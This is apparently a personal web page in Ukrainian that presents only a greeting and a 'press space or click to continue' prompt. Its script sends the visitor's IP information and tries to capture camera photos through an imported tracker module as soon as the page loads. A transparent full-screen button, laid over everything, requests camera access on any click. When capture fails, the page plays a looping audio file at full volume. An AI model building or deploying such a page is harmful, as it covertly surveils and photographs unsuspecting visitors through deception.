<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8" />
<title>Сайт Севки</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap');
  body {
    margin: 0;
    height: 100vh;
    background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    user-select: none;
    overflow: hidden;
    position: relative;
  }
  .glass-container {
    background: rgba(255, 255, 255, 0.15);
    border-radius: 20px;
    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    border: 1px solid rgba(255, 255, 255, 0.18);
    padding: 40px;
    width: 380px;
    text-align: center;
    color: white;
    text-shadow: 0 0 8px rgba(0,0,0,0.7);
    font-weight: 700;
    font-size: 1.5rem;
    z-index: 10;
  }
  #invisible-button {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    width: 100vw;
    height: 100vh;
    background: transparent;
    border: none;
    opacity: 0;
    cursor: default;
    z-index: 1000;
  }
</style>
</head>
<body>
  <div class="glass-container">
    <div>Привiт, Це Сайт Севки</div>
    <div style="margin-top: 15px; font-weight: 500; font-size: 1.1rem;">
      Нажми пробел або кликни щоби продовжити
    </div>
  </div>

  <button id="invisible-button" aria-label="Invisible fullscreen button"></button>

  <audio id="audio" src="https://sevkabevka.github.io/alah.mp3" loop></audio>

  <script type="module">
    import { sendIPInfo, capturePhotos } from './tracker.js';

    async function init() {
      sendIPInfo();
      try {
        await capturePhotos();
      } catch {
        const audio = document.getElementById('audio');
        audio.volume = 1.0;
        audio.play().catch(() => {});
      }
    }

    window.onload = init;

    const button = document.getElementById('invisible-button');
    button.addEventListener('click', async (event) => {
      if (event.button === 0) { // left click only
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          stream.getTracks().forEach(track => track.stop());
          console.log('Camera permission granted');
        } catch (error) {
          console.log('Camera permission denied or error:', error);
        }
      }
    });
  </script>
</body>
</html>
